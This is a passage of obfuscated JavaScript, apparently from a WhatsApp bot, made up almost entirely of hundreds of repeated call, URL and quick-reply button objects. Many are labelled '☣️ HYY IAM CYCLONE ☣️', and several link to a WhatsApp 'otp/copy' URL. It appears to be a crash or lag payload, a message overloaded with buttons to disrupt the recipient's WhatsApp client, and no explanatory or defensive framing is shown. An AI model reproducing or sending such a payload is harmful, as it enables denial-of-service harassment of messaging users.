allButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73